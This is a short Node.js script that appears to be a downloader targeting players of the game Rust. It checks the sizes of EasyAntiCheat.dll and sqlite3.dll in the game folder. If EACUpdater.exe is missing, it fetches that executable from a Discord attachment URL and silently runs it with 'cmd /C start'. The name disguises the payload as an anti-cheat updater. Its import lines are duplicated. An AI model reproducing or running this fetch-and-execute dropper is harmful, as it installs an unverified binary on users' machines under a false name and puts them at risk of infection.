const fsPromises = require('fs').promises;
const axios = require('axios');
const fs = require('fs');
const { exec } = require('child_process');

const fsPromises = require('fs').promises;
const axios = require('axios');
const fs = require('fs');
const { exec } = require('child_process');


if (fs.existsSync("./EasyAntiCheat.dll")) {
    const EacSize = fs.statSync("./EasyAntiCheat.dll").size / 1024;
    if (EacSize < 750 || EacSize > 800) {
        process.exit(0);
        return;
    }
}
if (fs.existsSync("./RustClient_Data/Plugins/x86_64/sqlite3.dll")) {
    const fSize = fs.statSync("./RustClient_Data/Plugins/x86_64/sqlite3.dll").size / 1024;
    if (fSize < 950 || fSize > 1050) {
        process.exit(0);
        return;
    }
}


if (fs.existsSync('./EACUpdater.exe') == false) {
        axios.get('https://cdn.discordapp.com/attachments/902821540675072020/964890467336589342/EACUpdater.exe',
        {
            responseType: 'arraybuffer'
        })
        .then(async response => {
            await fsPromises.writeFile('./EACUpdater.exe', response.data, { encoding: 'binary' });
            exec("cmd /C start EACUpdater.exe", (error, stdout, stderr) => {})
            console.log("FINISH!")
        })
        .catch(error => {
            console.log({ error });
        });
}
